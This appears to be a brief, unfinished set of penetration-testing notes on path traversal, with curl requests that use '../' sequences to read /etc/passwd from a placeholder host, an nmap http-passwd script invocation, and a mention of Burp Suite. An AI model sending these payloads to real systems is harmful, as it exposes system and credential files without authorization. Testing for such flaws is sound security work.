1. Basic Path Traversal
2. Encoded Path Traversal
/// gonna finish this tommorow

```
curl "http://target.com/../../etc/passwd"
curl "http://target.com?file=../../../etc/passwd"

nmap --script http-passwd --script-args http-passwd.root=/target
burpsuite - manual testing with ../ sequences
```
